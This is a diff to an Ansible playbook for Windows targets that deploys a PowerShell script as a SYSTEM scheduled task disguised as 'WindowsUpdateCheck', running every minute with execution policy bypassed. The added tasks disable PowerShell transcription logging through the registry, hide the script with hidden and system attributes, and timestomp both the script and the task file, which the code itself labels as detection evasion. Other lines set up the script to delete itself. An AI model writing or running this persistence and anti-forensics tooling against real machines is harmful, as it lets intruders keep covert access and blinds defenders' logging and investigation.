@@ -1,4 +1,12 @@
 ---
+- name: Disable PowerShell logging by modifying the registry
+  win_registry:
+    path: "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
+    name: "EnableTranscripting"
+    type: dword
+    data: "0"
+    state: present
+    
 - name: Copy PowerShell script to target
   win_copy:
     src: "files/doubletap.ps1"
@@ -6,7 +14,7 @@
 
 - name: Create Scheduled Task to Run Script Every Minute
   win_shell: |
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Windows\Temp\firewall_script.ps1"
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\firewall_script.ps1"
     $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
     Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force
   args:
@@ -24,20 +32,24 @@
     line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
     insertafter: 'Log " My work here is done"''
 
+- name: Apply hidden and system attributes to the PowerShell script
+  win_shell: |
+    attrib +h +s "C:\\Windows\\Temp\\firewall_script.ps1"
+
 - name: Timestomp script and task to evade detection
   win_shell: |
-    $time = (Get-Item "C:\Windows\System32\cmd.exe").CreationTime
-    (Get-Item "C:\Windows\Temp\firewall_script.ps1").CreationTime = $time
-    (Get-Item "C:\Windows\Temp\firewall_script.ps1").LastWriteTime = $time
-    (Get-Item "C:\Windows\Temp\firewall_script.ps1").LastAccessTime = $time
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").CreationTime = $time
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastWriteTime = $time
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastAccessTime = $time
   args:
     executable: powershell.exe
 
 - name: Timestomp Scheduled Task XML
   win_shell: |
-    $taskPath = "C:\Windows\System32\Tasks\WindowsUpdateCheck"
+    $taskPath = "C:\\Windows\\System32\\Tasks\\WindowsUpdateCheck"
     if (Test-Path $taskPath) {
-        $time = (Get-Item "C:\Windows\System32\cmd.exe").CreationTime
+        $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
         (Get-Item $taskPath).CreationTime = $time
         (Get-Item $taskPath).LastWriteTime = $time
         (Get-Item $taskPath).LastAccessTime = $time
